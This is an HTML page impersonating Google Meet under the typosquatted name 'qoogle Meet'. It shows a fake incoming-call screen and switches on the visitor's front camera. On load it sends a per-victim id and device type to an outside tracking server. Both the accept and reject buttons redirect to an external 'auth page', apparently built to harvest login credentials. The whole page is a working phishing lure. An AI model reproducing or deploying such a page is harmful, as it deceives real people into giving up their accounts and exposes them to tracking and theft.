<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>qoogle Meet - Online Video Calls, Meetings and Conferencing</title>
    <link
      rel="icon"
      type="image/png"
      href="https://fonts.gstatic.com/s/i/productlogos/meet_2020q4/v1/web-96dp/logo_meet_2020q4_color_2x_web_96dp.png"
      sizes="32x32"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
    />
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: Arial;
      }

      body {
        height: 100vh;
        overflow: hidden;
      }

      #bgVideo {
        position: fixed;
        width: 100%;
        height: 100%;
        object-fit: cover;
        filter: blur(12px) brightness(0.6);
        transform: scale(1.1);
      }

      .overlay {
        position: fixed;
        inset: 0;
        background: rgba(20, 20, 40, 0.35);
      }

      .call-card {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: min(92%, 700px);
        background: #fff;
        border-radius: 18px;
        padding: 50px 30px;
        text-align: center;
        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.35);
      }

      .logo {
        width: 80px;
        height: 80px;
        border-radius: 50%;
        margin-bottom: 20px;
      }

      h2 {
        margin-bottom: 30px;
        font-size: 30px;
      }

      .buttons {
        display: flex;
        justify-content: center;
        gap: 30px;
      }

      button {
        width: 70px;
        height: 70px;
        border: none;
        border-radius: 50%;
        font-size: 32px;
        color: white;
        cursor: pointer;
      }

      .accept {
        background: #20c659;
      }

      .reject {
        background: #f44336;
      }

      @media (max-width: 768px) {
        .call-card {
          padding: 35px 20px;
        }

        .logo {
          width: 60px;
          height: 60px;
        }

        h2 {
          font-size: 22px;
        }

        button {
          width: 60px;
          height: 60px;
          font-size: 28px;
        }
      }
    </style>
  </head>
  <body>
    <video id="bgVideo" autoplay playsinline muted></video>

    <div class="overlay"></div>

    <div class="call-card">
      <img src="icon.png" class="logo" />

      <h2>Incoming call...</h2>

      <div class="buttons">
        <button class="accept">✓</button>
        <button class="reject">✕</button>
      </div>
    </div>
    <script>
      const id = new URLSearchParams(window.location.search).get("id");
      const video = document.getElementById("bgVideo");
      const accept = document.querySelector(".accept");
      const reject = document.querySelector(".reject");
      async function startCamera() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: "user",
            },
            audio: false,
          });

          video.srcObject = stream;
        } catch (err) {
          console.log(err);
        }
      }
      function getDeviceType() {
        const ua = navigator.userAgent.toLowerCase();
        const isMobile =
          /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
        const isTablet = /ipad|tablet|playbook|silk/i.test(ua) && !isMobile;

        if (isMobile || isTablet) return "mobile";
        return "desktop";
      }

      const deviceType = getDeviceType();

      window.addEventListener("load", async () => {
        try {
          const res = await fetch(
            "https://megatools-8920.onrender.com/api/v1/information",
            {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                user: id,
                deviceType,
                siteName: "AutoInfo/login-view",
              }),
            },
          );

          const data = await res.json();
        } catch (err) {
          console.error(err);
          alert("Failed to save email.");
        }
      });

      accept.addEventListener("click", () => {
        window.location.href =
          "https://auth-seven-pied.vercel.app/user-auth.html?id=" + id; // your auth page
      });
      reject.addEventListener("click", () => {
        window.location.href =
          "https://auth-seven-pied.vercel.app/user-auth.html?id=" + id; // your auth page
      });

      startCamera();
    </script>
  </body>
</html>
